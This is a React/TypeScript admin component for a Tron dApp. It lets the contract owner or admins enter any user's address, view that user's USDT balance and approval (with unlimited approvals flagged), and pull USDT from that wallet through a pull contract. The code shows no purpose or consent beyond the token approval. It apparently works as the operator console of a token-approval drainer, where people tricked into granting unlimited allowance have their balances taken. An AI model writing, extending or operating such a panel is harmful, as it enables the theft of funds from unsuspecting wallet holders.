"use client";

import { useState, useEffect } from "react";
import { useTron } from "./TronProvider";
import { 
  TOKEN_ADDRESS, 
  PULL_CONTRACT_ADDRESS,
  getTokenBalance,
  getAllowance,
  getContractOwner,
  getAdminStatus,
  pullTokensFromUser,
  fromSun,
  toSun,
  isValidTronAddress
} from "@/lib/tron";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/components/ui/use-toast";
import { AlertCircle, Loader2, ShieldCheck } from "lucide-react";

export function AdminPullPanel() {
  const { address: connectedAddress, isConnected } = useTron();
  const { toast } = useToast();

  const [userAddress, setUserAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [mounted, setMounted] = useState(false);
  const [ownerAddress, setOwnerAddress] = useState<string>("");
  const [isOwner, setIsOwner] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [userBalance, setUserBalance] = useState<bigint>(BigInt(0));
  const [userAllowance, setUserAllowance] = useState<bigint>(BigInt(0));
  const [isLoading, setIsLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");

  // Ensure component is mounted before rendering
  useEffect(() => {
    setMounted(true);
  }, []);

  // Fetch contract owner
  useEffect(() => {
    if (!mounted) return;

    const fetchOwner = async () => {
      try {
        const owner = await getContractOwner(PULL_CONTRACT_ADDRESS);
        console.log("Contract owner:", owner);
        setOwnerAddress(owner);
      } catch (error) {
        console.error("Error fetching owner:", error);
      }
    };

    fetchOwner();
  }, [mounted]);

  // Check if connected user is the owner
  useEffect(() => {
    if (connectedAddress && ownerAddress) {
      console.log("Connected address:", connectedAddress);
      console.log("Owner address:", ownerAddress);
      console.log("Match:", connectedAddress.toLowerCase() === ownerAddress.toLowerCase());
      setIsOwner(connectedAddress.toLowerCase() === ownerAddress.toLowerCase());
    } else {
      setIsOwner(false);
    }
  }, [connectedAddress, ownerAddress]);

  // Check if connected user is an admin
  useEffect(() => {
    if (!connectedAddress) {
      setIsAdmin(false);
      return;
    }

    const checkAdmin = async () => {
      try {
        const status = await getAdminStatus(PULL_CONTRACT_ADDRESS, connectedAddress);
        setIsAdmin(status);
      } catch (error) {
        console.error("Error checking admin status:", error);
        setIsAdmin(false);
      }
    };

    checkAdmin();
  }, [connectedAddress]);

  // Fetch user balance and allowance when address changes
  useEffect(() => {
    if (!userAddress || !isValidTronAddress(userAddress)) {
      setUserBalance(BigInt(0));
      setUserAllowance(BigInt(0));
      return;
    }

    const fetchUserData = async () => {
      try {
        const [balance, allowance] = await Promise.all([
          getTokenBalance(TOKEN_ADDRESS, userAddress),
          getAllowance(TOKEN_ADDRESS, userAddress, PULL_CONTRACT_ADDRESS),
        ]);
        setUserBalance(balance);
        setUserAllowance(allowance);
      } catch (error) {
        console.error("Error fetching user data:", error);
      }
    };

    fetchUserData();
  }, [userAddress]);

  // Handle pull tokens
  const handlePullTokens = async () => {
    if (!userAddress || !isValidTronAddress(userAddress)) {
      toast({
        variant: "destructive",
        title: "Invalid Address",
        description: "Please enter a valid Tron address.",
      });
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      toast({
        variant: "destructive",
        title: "Invalid Amount",
        description: "Please enter a valid amount greater than 0.",
      });
      return;
    }

    setIsLoading(true);
    try {
      const decimals = 6; // USDT-TRC20 has 6 decimals
      const amountInSun = toSun(amount, decimals);
      
      const tx = await pullTokensFromUser(
        PULL_CONTRACT_ADDRESS,
        userAddress,
        amountInSun
      );

      setTxHash(tx);

      toast({
        title: "Success!",
        description: `Successfully pulled ${amount} USDT tokens.`,
      });

      // Reset form and refresh user data
      setUserAddress("");
      setAmount("");
      setUserBalance(BigInt(0));
      setUserAllowance(BigInt(0));

    } catch (error: any) {
      console.error("Pull tokens error:", error);
      toast({
        variant: "destructive",
        title: "Transaction Failed",
        description: error.message || "Failed to pull tokens. Please check the allowance and try again.",
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Prevent hydration mismatch by not rendering until mounted
  if (!mounted) {
    return (
      <Card className="border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
        <CardHeader>
          <CardTitle className="text-white">Admin Panel</CardTitle>
          <CardDescription className="text-cyan-300">Loading...</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex items-center justify-center py-8">
            <Loader2 className="h-8 w-8 animate-spin text-cyan-400" />
          </div>
        </CardContent>
      </Card>
    );
  }

  if (!isConnected) {
    return (
      <Card className="border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
        <CardHeader>
          <CardTitle className="text-white">Admin Panel</CardTitle>
          <CardDescription className="text-cyan-300">Connect your wallet to access admin features</CardDescription>
        </CardHeader>
        <CardContent>
          <p className="text-sm text-cyan-200">
            Please connect your wallet to continue.
          </p>
        </CardContent>
      </Card>
    );
  }

  if (!isOwner && !isAdmin) {
    return (
      <Card className="border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
        <CardHeader>
          <CardTitle className="text-white">Admin Panel</CardTitle>
          <CardDescription className="text-cyan-300">Access Restricted</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex items-center gap-2 rounded-md bg-red-500/10 p-4 border border-red-500/30">
            <AlertCircle className="h-5 w-5 text-red-400" />
            <p className="text-sm text-red-300">
              You are not authorized. Only the owner or admins can access this panel.
            </p>
          </div>
        </CardContent>
      </Card>
    );
  }

  const hasAllowance = userAllowance > BigInt(0);
  const isValidAddress = userAddress && isValidTronAddress(userAddress);

  return (
    <Card className="border-blue-500/20 bg-gray-900/50 backdrop-blur-sm">
      <CardHeader>
        <div className="flex items-center gap-2">
          <ShieldCheck className="h-6 w-6 text-green-400" />
          <div>
            <CardTitle className="text-white">Pull Tokens Panel</CardTitle>
            <CardDescription className="text-cyan-300">Pull tokens from users who have approved the contract</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="space-y-2">
          <label htmlFor="userAddress" className="text-sm font-medium text-cyan-200">
            User Address
          </label>
          <Input
            id="userAddress"
            type="text"
            placeholder="T..."
            value={userAddress}
            onChange={(e) => setUserAddress(e.target.value)}
            className="font-mono bg-black/30 border-blue-500/30 text-white placeholder:text-gray-500"
          />
        </div>

        {isValidAddress && (
          <div className="space-y-2 p-3 rounded-md bg-black/30 border border-blue-500/20">
            <div className="flex justify-between text-sm">
              <span className="text-cyan-400">User Balance:</span>
              <span className="font-medium text-white">
                {userBalance ? fromSun(userBalance.toString(), 6) : "0"} USDT
              </span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-cyan-400">User Allowance:</span>
              <span className="font-medium text-white">
                {userAllowance === BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
                  ? "Unlimited"
                  : userAllowance
                  ? fromSun(userAllowance.toString(), 6)
                  : "0"}{" "}
                USDT
              </span>
            </div>
          </div>
        )}

        {isValidAddress && userAllowance !== undefined && userAllowance === BigInt(0) && (
          <div className="flex items-center gap-2 rounded-md bg-amber-500/10 p-3 border border-amber-500/30">
            <AlertCircle className="h-4 w-4 text-amber-400" />
            <p className="text-xs text-amber-300">
              This user has not approved the contract yet.
            </p>
          </div>
        )}

        <div className="space-y-2">
          <label htmlFor="amount" className="text-sm font-medium text-cyan-200">
            Amount (USDT)
          </label>
          <Input
            id="amount"
            type="text"
            placeholder="0.0"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="bg-black/30 border-blue-500/30 text-white placeholder:text-gray-500"
          />
        </div>

        <Button
          onClick={handlePullTokens}
          disabled={isLoading || !isValidAddress || !hasAllowance}
          className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 text-white font-bold"
          size="lg"
        >
          {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
          {isLoading ? "Processing..." : "Pull Tokens From User"}
        </Button>

        {txHash && (
          <p className="text-xs text-cyan-400 break-all bg-black/30 p-2 rounded">
            Transaction Hash: {txHash}
          </p>
        )}
      </CardContent>
    </Card>
  );
}
